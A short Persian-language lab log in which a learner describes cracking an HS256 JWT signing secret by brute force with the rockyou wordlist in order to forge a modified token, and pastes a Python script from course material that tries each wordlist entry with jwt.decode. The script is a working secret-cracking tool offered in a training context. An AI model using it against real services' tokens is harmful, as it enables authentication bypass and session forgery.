کاری که توی این lab باید انجام بدم اینه : پیداکردن کلید سری‌ امضای توکن‌ JWT به‌وسیله Brute-Force و تغییر محتوای توکن خود به کمک این کلید.

خب یه لیست rockyou داده شده، ولی مساله اینجاست که نمیدونم با چه ابزاری باید از brute force استفاده کنم و اصلا چه راهکاری وجود داره. صرفا تا اینجا JWT رو decode کردم و محتواش رو دارم. البته از محتواش چیز زیادی دست گیرم نشد. صرفا فهمیدم رمزنگاری به روش HS256 هستش.

خب همین الان یه کد پایتون داخل درسنامه توجه ام رو جلب کردم. برم باهاش درگیر بشم!

خب فکر کنم راه حل این کد باشه ولی هنوز به نتیجه ای بهش نرسیدم (نمیدونم چرا توکن JWT کپی شده از بخش DevTools مربوط به lab رو بهش میدم، فایل rockyou.txt هم بهش میدم، همچنان کلی ارور میده نمیدونم!)


<pre>

# pip install pyjwt
import jwt

def brute_force_jwt(jwt_token, wordlist_file):
    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as file:
        for password in file:
            password = password.strip()
            try:
                decoded = jwt.decode(jwt_token, password, algorithms=["HS256"])
                print(f"[SUCCESS] Secret key found: '{password}'")
                print(f"Decoded Payload: {decoded}")
                return
            except jwt.InvalidTokenError:
                continue
    print("[FAILED] No valid secret key found.")

if __name__ == "__main__":
    jwt_token = input("Enter the JWT token: ").strip()
    wordlist_file = input("Enter the wordlist file path: ").strip()
    brute_force_jwt(jwt_token, wordlist_file)

  
</pre>
